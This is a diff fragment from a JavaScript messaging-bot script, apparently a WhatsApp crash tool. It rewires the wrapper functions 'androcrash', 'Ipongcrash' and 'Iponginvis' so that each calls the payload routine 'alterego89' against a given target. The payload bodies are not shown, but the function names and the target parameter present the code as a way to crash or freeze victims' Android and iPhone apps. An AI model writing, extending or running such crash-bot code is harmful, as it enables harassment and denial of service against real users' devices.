@@ -3296,19 +3296,19 @@ async function alterego89(sock, target) {
 // ====================== FUNC PANGGILANNYA ====================== //
 async function androcrash(sock, target) {
      for (let i = 0; i < 1; i++) {
-         await DictiveBlank(sock, target);
+         await alterego89(sock, target);
          }
      }
      
 async function Ipongcrash(sock, target) {
      for (let i = 0; i < 1; i++) {
-         await DictiveBlank(sock, target);
+         await alterego89(sock, target);
          }
      }
      
 async function Iponginvis(sock, target) {
      for (let i = 0; i < 1; i++) {
-         await DictiveBlank(sock, target);
+         await alterego89(sock, target);
          }
      }
 
